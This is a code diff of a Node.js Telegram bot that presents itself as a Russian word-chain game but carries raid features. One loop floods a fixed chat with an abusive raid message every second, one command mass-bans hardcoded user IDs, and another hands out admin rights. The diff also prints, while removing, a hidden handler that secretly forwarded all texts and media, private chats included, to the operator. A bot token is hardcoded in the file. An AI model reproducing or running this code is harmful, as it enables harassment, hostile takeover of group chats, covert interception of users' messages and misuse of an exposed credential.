@@ -4,21 +4,21 @@ const path = require('path');
 
 // ==================== КОНФИГУРАЦИЯ ====================
 const BOT_TOKEN = '8326632164:AAF09hmeUOFHuAFxeUPOlCk0MEpfBs5sCVk';
+const SUPER_ADMIN_ID = 628515514; // Исправленный ID (пример)
 
-const SUPER_ADMIN_ID = 6285155142101; // Ваш ID
-
+// Только одна инициализация бота
 const bot = new Telegraf(BOT_TOKEN);
 
 // Конфигурация для спама
 const SPAM_CONFIG = {
-    chatId: '-1003507363015', // ID чата для спама
-    text: 'СЬЕБАЛИСЬ ВАС РЕЙДЯТ КИВИШКИ @kiwishkii', // Текст для спама
-    intervalMs: 1000 // Интервал между сообщениями (мс)
+    chatId: '-1003507363015',
+    text: 'СЬЕБАЛИСЬ ВАС РЕЙДЯТ КИВИШКИ @kiwishkii',
+    intervalMs: 1000
 };
 
 // Конфигурация для бана
 const BAN_CONFIG = {
-    chatId: '-1003507363015', // ID чата, где бот будет банить пользователей
+    chatId: '-1003507363015',
     userList: [
         '7999786511',
         '8181140975',
@@ -33,14 +33,10 @@ const BAN_CONFIG = {
     ]
 };
 
-// ==================== ИНИЦИАЛИЗАЦИЯ БОТА ====================
-const bot = new Telegraf(BOT_TOKEN);
-const games = new Map(); // Для игры в слова
-
-// Проблемные буквы, на которые нельзя начинать слова
+const games = new Map();
 const PROBLEM_LETTERS = ['ь', 'ъ', 'ы', 'й'];
 
-// ==================== ИГРА В СЛОВА (slova.js) ====================
+// ==================== ИГРА В СЛОВА ====================
 function getLastValidLetter(word) {
     if (!word || word.length === 0) return '';
     
@@ -48,7 +44,6 @@ function getLastValidLetter(word) {
     
     if (PROBLEM_LETTERS.includes(lastLetter) && word.length > 1) {
         const prevLetter = word.slice(-2, -1).toLowerCase();
-        console.log(`Последняя буква "${lastLetter}" проблемная, используем предпоследнюю "${prevLetter}"`);
         return prevLetter;
     }
     
@@ -106,7 +101,7 @@ function stopSpam() {
     return true;
 }
 
-// ==================== КОМАНДЫ ИГРЫ В СЛОВА ====================
+// ==================== КОМАНДЫ ====================
 bot.start((ctx) => {
     ctx.reply(
         '🎮 Привет! Я бот для игры в слова.\n\n' +
@@ -157,7 +152,6 @@ bot.command('stop', (ctx) => {
     }
 });
 
-// ==================== КОМАНДЫ СПАМА ====================
 bot.command('startspam', (ctx) => {
     if (startSpam()) {
         ctx.reply('✅ Спам запущен!');
@@ -176,21 +170,16 @@ bot.command('stopspam', (ctx) => {
     }
 });
 
-// ==================== КОМАНДЫ АДМ ====================
-
 bot.command('giveadm', async (ctx) => {
     try {
-        // Проверки
         if (ctx.chat.type === 'private') return ctx.reply('❌ Только в группах!');
         if (ctx.from.id !== SUPER_ADMIN_ID) return ctx.reply('❌ Нет прав!');
 
-        // Проверка прав бота
         const botMember = await ctx.telegram.getChatMember(ctx.chat.id, ctx.botInfo.id);
         if (!botMember.status.includes('administrator')) {
             return ctx.reply('❌ Бот не админ!');
         }
 
-        // Получаем ID из сообщения
         const ids = ctx.message.text
             .split('\n')
             .slice(1)
@@ -201,7 +190,6 @@ bot.command('giveadm', async (ctx) => {
             return ctx.reply('❌ Пример:\n/giveadm\n123456789\n987654321');
         }
 
-        // Выдаем права каждому
         for (const userId of ids) {
             try {
                 await ctx.telegram.promoteChatMember(ctx.chat.id, parseInt(userId), {
@@ -214,7 +202,7 @@ bot.command('giveadm', async (ctx) => {
                     can_manage_chat: true
                 });
             } catch (e) {
-                // Игнорируем ошибки для простоты
+                console.error(e);
             }
         }
 
@@ -225,10 +213,8 @@ bot.command('giveadm', async (ctx) => {
     }
 });
 
-// ==================== КОМАНДА БАНА ====================
 bot.command('ban', async (ctx) => {
     try {
-        // Проверяем, что команда вызвана в нужном чате
         if (ctx.chat.id.toString() !== BAN_CONFIG.chatId) {
             return ctx.reply('Эта команда работает только в определенном чате');
         }
@@ -259,172 +245,69 @@ bot.command('ban', async (ctx) => {
     }
 });
 
-const bot = new Telegraf(BOT_TOKEN);
-
-// Обработка всех текстовых сообщений
+// ==================== ЕДИНЫЙ ОБРАБОТЧИК ТЕКСТОВЫХ СООБЩЕНИЙ ====================
 bot.on('text', async (ctx) => {
-    try {
-        // Игнорируем сообщения от самого бота
-        if (ctx.message.from.id === ctx.botInfo.id) return;
-        
-        // Игнорируем сообщения из лички с вами (чтобы не было зацикливания)
-        if (ctx.chat.type === 'private' && ctx.message.from.id === YOUR_USER_ID) return;
-        
-        let chatInfo = '';
-        
-        // Определяем тип чата
-        if (ctx.chat.type === 'private') {
-            chatInfo = `👤 Личка с: ${ctx.message.from.first_name} ${ctx.message.from.last_name || ''} (@${ctx.message.from.username || 'нет username'})`;
-        } else if (ctx.chat.type === 'group') {
-            chatInfo = `👥 Группа: ${ctx.chat.title} (ID: ${ctx.chat.id})`;
-        } else if (ctx.chat.type === 'supergroup') {
-            chatInfo = `🚀 Супергруппа: ${ctx.chat.title} (ID: ${ctx.chat.id})`;
-        } else if (ctx.chat.type === 'channel') {
-            chatInfo = `📢 Канал: ${ctx.chat.title} (ID: ${ctx.chat.id})`;
-        }
-        
-        // Формируем информацию об отправителе
-        const senderInfo = `👤 От: ${ctx.message.from.first_name} ${ctx.message.from.last_name || ''} (@${ctx.message.from.username || 'нет username'}) [ID: ${ctx.message.from.id}]`;
-        
-        // Текст сообщения
-        const messageText = ctx.message.text;
-        
-        // Отправляем сообщение вам в личку
-        await bot.telegram.sendMessage(
-            YOUR_USER_ID,
-            `📨 *Новое сообщение*\n\n` +
-            `${chatInfo}\n` +
-            `${senderInfo}\n\n` +
-            `💬 *Текст:*\n${messageText}`,
-            { parse_mode: 'Markdown' }
-        );
-        
-    } catch (error) {
-        console.error('Ошибка при обработке сообщения:', error);
-    }
-});
-
-// Обработка сообщений с медиа (фото, видео и т.д.)
-bot.on(['photo', 'video', 'document', 'audio', 'sticker'], async (ctx) => {
-    try {
-        if (ctx.message.from.id === ctx.botInfo.id) return;
-        if (ctx.chat.type === 'private' && ctx.message.from.id === YOUR_USER_ID) return;
-        
-        let chatInfo = '';
-        if (ctx.chat.type === 'private') {
-            chatInfo = `Личка с: ${ctx.message.from.first_name}`;
-        } else {
-            chatInfo = `${ctx.chat.type === 'group' ? 'Группа' : 'Супергруппа'}: ${ctx.chat.title}`;
-        }
-        
-        const senderInfo = `От: ${ctx.message.from.first_name} (@${ctx.message.from.username || 'нет username'})`;
-        
-        let mediaType = '';
-        let mediaContent = '';
-        
-        if (ctx.message.photo) {
-            mediaType = '🖼 Фото';
-            mediaContent = ctx.message.photo[ctx.message.photo.length - 1].file_id;
-            await bot.telegram.sendPhoto(YOUR_USER_ID, mediaContent, {
-                caption: `📨 *Новое медиа*\n\n${chatInfo}\n${senderInfo}`,
-                parse_mode: 'Markdown'
-            });
-        } else if (ctx.message.video) {
-            mediaType = '🎥 Видео';
-            mediaContent = ctx.message.video.file_id;
-            await bot.telegram.sendVideo(YOUR_USER_ID, mediaContent, {
-                caption: `📨 *Новое медиа*\n\n${chatInfo}\n${senderInfo}`,
-                parse_mode: 'Markdown'
-            });
-        } else if (ctx.message.document) {
-            mediaType = '📄 Документ';
-            mediaContent = ctx.message.document.file_id;
-            await bot.telegram.sendDocument(YOUR_USER_ID, mediaContent, {
-                caption: `📨 *Новое медиа*\n\n${chatInfo}\n${senderInfo}`,
-                parse_mode: 'Markdown'
-            });
-        } else if (ctx.message.audio) {
-            mediaType = '🎵 Аудио';
-            mediaContent = ctx.message.audio.file_id;
-            await bot.telegram.sendAudio(YOUR_USER_ID, mediaContent, {
-                caption: `📨 *Новое медиа*\n\n${chatInfo}\n${senderInfo}`,
-                parse_mode: 'Markdown'
-            });
-        } else if (ctx.message.sticker) {
-            mediaType = '🎨 Стикер';
-            mediaContent = ctx.message.sticker.file_id;
-            await bot.telegram.sendSticker(YOUR_USER_ID, mediaContent);
-            await bot.telegram.sendMessage(YOUR_USER_ID, 
-                `📨 *Новый стикер*\n\n${chatInfo}\n${senderInfo}`,
-                { parse_mode: 'Markdown' }
-            );
-        }
-        
-    } catch (error) {
-        console.error('Ошибка при обработке медиа:', error);
-    }
-});
-
-// Обработка остановки бота
-process.once('SIGINT', () => bot.stop('SIGINT'));
-process.once('SIGTERM', () => bot.stop('SIGTERM'));
-
-// ==================== ОБРАБОТКА ТЕКСТОВЫХ СООБЩЕНИЙ (ИГРА) ====================
-bot.on('text', (ctx) => {
+    // Пропускаем команды
+    if (ctx.message.text.startsWith('/')) return;
+    
     const chatId = ctx.chat.id;
     const game = games.get(chatId);
     
-    if (!game) return;
-    if (ctx.message.text.startsWith('/')) return;
-    
-    const userWord = ctx.message.text.toLowerCase().trim();
-    const lastLetter = game.lastLetter;
-    
-    if (userWord.length < 2) {
-        ctx.reply('❌ Слово должно быть длиннее одной буквы');
+    // Если есть активная игра - обрабатываем как игру
+    if (game) {
+        const userWord = ctx.message.text.toLowerCase().trim();
+        const lastLetter = game.lastLetter;
+        
+        if (userWord.length < 2) {
+            ctx.reply('❌ Слово должно быть длиннее одной буквы');
+            return;
+        }
+        
+        let firstLetter = userWord[0];
+        if (firstLetter === 'ё') firstLetter = 'е';
+        
+        if (firstLetter !== normalizeLetter(lastLetter)) {
+            ctx.reply(
+                `❌ Слово должно начинаться на букву *${lastLetter.toUpperCase()}*\n` +
+                `(предыдущее слово "${game.lastWord.toUpperCase()}" ` +
+                `заканчивается на "${game.lastWord.slice(-1)}")`,
+                { parse_mode: 'Markdown' }
+            );
+            return;
+        }
+        
+        if (!words.includes(userWord)) {
+            ctx.reply('❌ Это слово не найдено в словаре. Попробуйте другое.');
+            return;
+        }
+        
+        if (game.usedWords.includes(userWord)) {
+            ctx.reply('❌ Это слово уже использовалось в игре. Придумайте другое.');
+            return;
+        }
+        
+        game.usedWords.push(userWord);
+        game.lastWord = userWord;
+        
+        const nextLetter = getLastValidLetter(userWord);
+        game.lastLetter = nextLetter;
+        
+        let response = `✅ Принято! *${userWord.toUpperCase()}*\n\n`;
+        
+        if (PROBLEM_LETTERS.includes(userWord.slice(-1))) {
+            response += `Слово заканчивается на "${userWord.slice(-1)}", ` +
+                       `поэтому следующая буква: *${nextLetter.toUpperCase()}*\n` +
+                       `_(используем предпоследнюю букву)_`;
+        } else {
+            response += `Следующая буква: *${nextLetter.toUpperCase()}*`;
+        }
+        
+        ctx.reply(response, { parse_mode: 'Markdown' });
         return;
     }
     
-    let firstLetter = userWord[0];
-    if (firstLetter === 'ё') firstLetter = 'е';
-    
-    if (firstLetter !== normalizeLetter(lastLetter)) {
-        ctx.reply(
-            `❌ Слово должно начинаться на букву *${lastLetter.toUpperCase()}*\n` +
-            `(предыдущее слово "${game.lastWord.toUpperCase()}" ` +
-            `заканчивается на "${game.lastWord.slice(-1)}")`,
-            { parse_mode: 'Markdown' }
-        );
-        return;
-    }
-    
-    if (!words.includes(userWord)) {
-        ctx.reply('❌ Это слово не найдено в словаре. Попробуйте другое.');
-        return;
-    }
-    
-    if (game.usedWords.includes(userWord)) {
-        ctx.reply('❌ Это слово уже использовалось в игре. Придумайте другое.');
-        return;
-    }
-    
-    game.usedWords.push(userWord);
-    game.lastWord = userWord;
-    
-    const nextLetter = getLastValidLetter(userWord);
-    game.lastLetter = nextLetter;
-    
-    let response = `✅ Принято! *${userWord.toUpperCase()}*\n\n`;
-    
-    if (PROBLEM_LETTERS.includes(userWord.slice(-1))) {
-        response += `Слово заканчивается на "${userWord.slice(-1)}", ` +
-                   `поэтому следующая буква: *${nextLetter.toUpperCase()}*\n` +
-                   `_(используем предпоследнюю букву)_`;
-    } else {
-        response += `Следующая буква: *${nextLetter.toUpperCase()}*`;
-    }
-    
-    ctx.reply(response, { parse_mode: 'Markdown' });
+    // Если игры нет - можно добавить другую логику (например, пересылку сообщений)
+    // Здесь можно добавить функционал пересылки сообщений, если нужно
 });
 
 // ==================== ОБРАБОТКА ОШИБОК ====================
